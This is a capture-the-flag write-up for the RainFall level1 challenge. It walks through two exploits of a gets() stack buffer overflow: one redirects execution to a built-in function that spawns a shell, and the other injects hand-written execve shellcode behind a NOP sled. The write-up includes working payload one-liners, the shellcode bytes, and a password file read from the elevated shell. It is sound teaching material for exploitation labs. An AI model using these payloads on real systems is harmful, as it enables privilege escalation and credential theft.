# level1 - Stack Buffer Overflow - Victory Function

<details>

<summary><h2>First Solution</h2></summary>

On `level1`'s HOME, we find a binary named : `level1`

```shell
(gdb) info func
All defined functions:
...
0x08048444  run
0x08048480  main
...
```

We find two interesting function in this binary : `main()` and `run()`.
let's disassemble these functions:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb) disass run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```

As we see in the function `main`, a buffer of 40 is allocate on the
stack of and passed as argument to `gets()`. The function `gets()` read
on stdin and don't check if the input buffer is big enough to hold
the string. There are here a simple BOF, and we can rewrite `eip` to an
other function ...


In other hand there is the `run` function which write something and do a
system call. It looks like a *victory function*. So let's exploit exploit
`main` function to redirect the execution to `run` function, anfd next break
on `run` function to know what is the system call.

<br>

We break on `gets()` call in function `main` to find the right offset
(on the target machine)
```shell
(gdb) b *0x8048490
Breakpoint 1 at 0x8048490
(gdb) r <<< $(python -c "print 'A' * 100")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 100")

Breakpoint 1, 0x08048490 in main ()
(gdb) x/x $esp+0x10
0xbffff6e0:	0x080484a0
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048490 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

```

So from value between the begin of buffer and `eip`, we compute an offset of 76
bytes. This knowing, we just have to rewrite `eip` to point to address 
`0x08048444` which is the address of `run` function. Our new payload is:
```shell
python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]"
```

<br>

Let's break now on system call in `run` function :
```shell
(gdb) b *0x08048479
Breakpoint 1 at 0x8048479
(gdb) <<< $(python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]")
Undefined command: "<<<".  Try "help".
(gdb) r <<< $(python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]")
Good... Wait what?

Breakpoint 1, 0x08048479 in run ()
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

<br>

As we see, we just have to keep the stdin open to get a shell with good
privilege. :
```shell
level1@RainFall:~$ (python -c "print 'A' * 76 + '\x08\x04\x84\x44'[::-1]"; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```


Perfect, we got the `level2`'s password !

> Note: a python script (`exploit1-1.sh`) is provide in `Ressources` file to
> run this exploit from attacker machine (change host ip in the script according to your configuration).

</details>

<details>

<summary><h2>Second Solution</h2></summary>

On `level1`'s HOME, we find a binary named : `level1`

let's disassemble the `main` function of this binary:

```shell
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

As we see, a buffer of 40 is allocate on the stack of and passed as argument to `gets()`.
The function `gets()` read on stdin and don't check if the input buffer is big
enough to hold the string. So it's a simple BOF.
So let's exploit it !

<br>

We break on `gets()` call to find the right offset (on the
target machine)
```shell
(gdb) b *0x8048490
Breakpoint 1 at 0x8048490
(gdb) r <<< $(python -c "print 'A' * 100")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 100")

Breakpoint 1, 0x08048490 in main ()
(gdb) x/x $esp+0x10
0xbffff6e0:	0x080484a0
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048490 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

```

So from value between the begin of buffer and `eip`, we compute an offset of 76
bytes. This knowing, we just have to rewrite `eip` to point to an emplacement on
the buffer where is our crafted shellcode.

<br>

This is our crafted shellcode (on our machine) from this snippet:
```shell
execve('/bin//sh')
```

```shell
>$ cat /tmp/exploit1-2.s
global _start

section .text
_start:
    xor eax, eax        ; set eax to 0
    xor ecx, ecx        ; value to NULL to prevent misbehavior
    xor edx, edx        ; value to NULL to prevent misbehavior
    mov al, 11          ; execve syscall number
    push edx            ; push NULL string terminator
    mov ebx, '//sh'     ; first arg to /sh
    push ebx            ; push to stack
    mov ebx, '/bin'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov ebx, esp        ; move pointer to '/bin//sh'
    int    0x80         ; syscall
```

After compile it, let's extract the shellcode (on our machine):
```shell
(cd /tmp && nasm -f elf exploit1-2.s && ld -m elf_i386 -o exploit1-2 exploit1-2.o)
count=0; for i in $(objdump -d /tmp/exploit1-2 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

We get now our shellcode in well form with his length:
```shell
[SNIP]
\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80
25 bytes
```

<br>

Perfect, to exploit we need to find the new `eip` address value.
Let's test it with gdb to retrieve it (on the target machine):
```shell
(gdb) b *0x08048495
Breakpoint 1 at 0x8048495
(gdb) r <<< $(python -c "print 'A' * 80")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 80")

Breakpoint 1, 0x08048495 in main ()
(gdb) x/30x $esp
0xbffff6d0:	0xbffff6e0	0x0000002f	0xbffff72c	0xb7fd0ff4
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x00000000	0xbffff7c4	0xbffff7cc	0xb7fdc858
0xbffff740:	0x00000000	0xbffff71c
```
It seems like `0xbffff6e0` as `eip` value, but after some testing we find
`0xbffff720` as `eip` value due to different mapping when using gdb.

> Note: the memory mapping can change. So, if this exploit fail, break on this
> point with gdb and look around to find the good offset.

<br>

To summary, we have:
- An offset of **76 bytes** before `eip`
- A shellcode with a length of **25 bytes**
- The new address of `eip` : **0xbffff720**

<br>

So our payload (using python) will be:
- NOP instruction -> `\x90` * 35 
- Our shellcode -> `\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80`
- NOP instruction -> `\x90` * 16 
- New `eip` address : `\xbf\xff\xf7\x20`


> Note: There are an oveflow with the over stack when we return
> from main. Indeed, the end of the buffer will overlap to the pop value of esp.
> So we added some nop instruction after shellcode to rewrite `eip`.

<br>


We can now exploit this BOF :

```shell
(python -c "print '\x90' * 35 +  '\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80' + '\x90'*16 + '\xbf\xff\xf7\x20'[::-1]"; cat) | ./level1
```
```shell
level1@RainFall:~$ (python -c "print '\x90' * 35 +  '\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80' + '\x90'*16 + '\xbf\xff\xf7\x20'[::-1]"; cat) | ./level1
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Perfect, we got the `level2`'s password !

</details>
